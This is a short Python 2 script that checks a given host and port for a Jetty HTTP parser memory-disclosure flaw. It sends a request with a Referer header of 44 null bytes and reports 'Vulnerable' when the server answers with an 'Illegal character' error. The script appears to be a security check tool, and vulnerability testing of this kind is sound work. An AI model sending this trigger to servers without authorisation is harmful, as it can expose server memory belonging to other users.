#!/usr/bin/python
###########################################################################################################################
# Test script to check Jetty HttpParser Error Remote Memory Disclosure
# Version 1.00 Build 20150610
# Created by Ashwani Talreja
# Email: indian.hackerz.ash@gmail.com
# Please report if any errors on above email id for improvements within the script
###########################################################################################################################

import errno
from socket import error as socket_error
import httplib, urllib, sys, re

def validIP(address):
    parts = address.split(".")
    if len(parts) != 4:
        return False
    for item in parts:
        if not 0 <= int(item) <= 255:
            return False
    return True

def is_valid_hostname(hostname):
    if len(hostname) > 255:
        return False
    if hostname[-1] == ".":
        hostname = hostname[:-1] # strip exactly one dot from the right, if present
    allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))	

print "Script created by Ashwani Talreja - Version 1.00 Build 20150610"
print "Jetty HttpParser Error Remote Memory Disclosure Check"
print

if len(sys.argv) < 3 :
	print "Usage: Jetty_RMD.py Hostname Port"
	print "Example: Jetty_RMD.py google.com 443"
	print "Example: Jetty_RMD.py 10.10.10.10 443"
	sys.exit(1)
elif is_valid_hostname(sys.argv[1]) == False and validIP(sys.argv[1]) == False :
	print "Usage: Jetty_RMD.py Hostname Port"
	print "Example: Jetty_RMD.py google.com 8443"
	print "Example: Jetty_RMD.py 10.10.10.10 8443"
	sys.exit(1)
elif sys.argv[2].isdigit() == False :
	print "Usage: Jetty_RMD.py Hostname Port"
	print "Example: Jetty_RMD.py google.com 8080"
	print "Example: Jetty_RMD.py 10.10.10.10 8080"
	sys.exit(1)

try:
	conn = httplib.HTTPConnection(str(sys.argv[1]) + ":" + str(sys.argv[2]))
	headers = {"Referer": chr(0)*44}
	conn.request("GET", "/", "", headers)
	res = conn.getresponse()
	if res.reason.find("Illegal character") != -1 :
		print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " is Vulnerable !!!"
		print
		print "The code produced the following truncated output:"
		if res.version == 10:
			print "HTTP/1.0", res.status, res.reason
		elif res.version == 11:
			print "HTTP/1.1", res.status, res.reason
	else:
		print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " is not vulnerable."
		print
		print "The code produced the following truncated output:"
		if res.version == 10:
			print "HTTP/1.0", res.status, res.reason
		elif res.version == 11:
			print "HTTP/1.1", res.status, res.reason
except httplib.BadStatusLine:
	print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " is not vulnerable."
except socket_error as err:
	print "Unable to connect to " + str(sys.argv[1]) + ":" + str(sys.argv[2])
except BaseException:
	print "Host " + str(sys.argv[1]) + ":" + str(sys.argv[2]) + " threw some malformed error."
